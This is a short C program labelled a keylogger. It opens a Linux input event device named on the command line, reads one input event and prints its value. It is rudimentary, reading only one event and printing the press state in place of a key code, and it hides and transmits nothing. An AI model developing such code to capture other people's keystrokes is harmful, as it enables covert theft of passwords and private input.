#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <linux/input.h>
#include <unistd.h>
int main(int argc, char *argv[]){
  if(argc != 2 ){
    printf("Usage: %s <event-file>\n",argv[0]);
    exit(-1);
  }
  printf("keylogger is avtive right now....\n");
  int fd = open(argv[1], O_RDONLY,0);
  struct input_event ie;
  read(fd,&ie,sizeof(ie));

  printf("key pressed: %d\n",ie.value);

}
